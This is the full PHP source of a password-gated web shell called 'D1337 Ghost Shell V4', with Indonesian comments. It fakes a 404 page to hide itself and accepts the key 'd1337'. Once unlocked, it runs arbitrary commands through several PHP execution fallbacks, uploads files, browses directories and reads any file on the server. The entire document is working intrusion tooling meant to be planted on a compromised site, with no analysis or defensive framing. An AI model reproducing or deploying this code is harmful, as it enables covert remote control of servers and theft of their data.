<?php
// D1337 V4 - GHOST KEY EDITION
// Password: ?key=d1337
$k = "d1337";
if(!isset($_GET['key']) || $_GET['key'] != $k){
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The requested URL was not found on this server.");
}

// --- START CORE V2 (YANG WORK) ---
error_reporting(0);
 @ini_set('display_errors', 0);

function get_perms($file){
    return substr(sprintf('%o', fileperms($file)), -4);
}

function rce($cmd){
    $out = "";
    if(function_exists('system')){ ob_start(); system($cmd); $out = ob_get_contents(); ob_end_clean(); }
    elseif(function_exists('exec')){ exec($cmd, $o); $out = implode("\n", $o); }
    elseif(function_exists('passthru')){ ob_start(); passthru($cmd); $out = ob_get_contents(); ob_end_clean(); }
    elseif(function_exists('shell_exec')){ $out = shell_exec($cmd); }
    elseif(function_exists('popen')){ $fp = popen($cmd, 'r'); while(!feof($fp)) $out .= fread($fp, 1024); pclose($fp); }
    elseif(function_exists('proc_open')){ 
        $d = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
        $p = proc_open($cmd, $d, $pipes);
        if(is_resource($p)){
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
        }
    }
    return $out;
}

$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace("\\", "/", $dir);
if(is_dir($dir)) chdir($dir);

// Tambahin key di setiap link biar gak logout
$self = "?key=$k"; 

echo "<style>body{background:#000;color:#0f0;font-family:monospace;padding:10px;}a{color:#fff;text-decoration:none;}a:hover{text-decoration:underline;}input,textarea{background:#222;border:1px solid #444;color:#fff;padding:5px;}table{width:100%;border-collapse:collapse;}td,th{padding:5px;border-bottom:1px solid #333;}</style>";

echo "<pre>";
echo "<b>D1337 GHOST SHELL V4</b> | User: ".get_current_user()." | Path: $dir\n";
echo "Disabled Functions: " . (ini_get('disable_functions') ? ini_get('disable_functions') : "NONE") . "\n";
echo "<hr>";

// COMMAND EXECUTION
echo "<form method='post' action='$self&d=$dir'>CMD: <input type='text' name='cmd' size='50' autofocus><input type='submit' value='Run'></form>";
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo "<b>$ $cmd</b>\n";
    $res = rce($cmd);
    if(empty($res)) echo "[!] Output kosong / RCE Disabled.\n";
    else echo htmlspecialchars($res);
}
echo "<hr>";

// FILE UPLOAD
echo "<form method='post' enctype='multipart/form-data' action='$self&d=$dir'>Upload: <input type='file' name='f'><input type='submit' value='Upload'></form>";
if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "[+] Upload Sukses!\n";
    else echo "[-] Upload Gagal!\n";
}

// FILE LIST
echo "\n[ FILE MANAGER ]\n";
$scandir = scandir($dir);
echo "<table>";
foreach($scandir as $file){
    if(!is_dir($file) && !is_file($file)) continue;
    $type = is_dir($file) ? "DIR" : "FILE";
    $size = is_file($file) ? filesize($file) : "-";
    $perm = get_perms($file);
    
    // Logic link harus bawa key terus
    $link_dir = "$self&d=$dir/$file";
    $link_read = "$self&d=$dir&read=$file";
    
    $link = ($type == "DIR") ? $link_dir : $link_read;
    
    echo "<tr><td>$type</td><td><a href='$link' style='color:#fff;'>$file</a></td><td>$size</td><td>$perm</td></tr>";
}
echo "</table>";

// READ FILE
if(isset($_GET['read'])){
    $f = $_GET['read'];
    echo "\n<hr><b>Reading: $f</b>\n";
    echo "<textarea style='width:100%;height:300px;'>".htmlspecialchars(file_get_contents($f))."</textarea>";
}

echo "</pre>";
?>
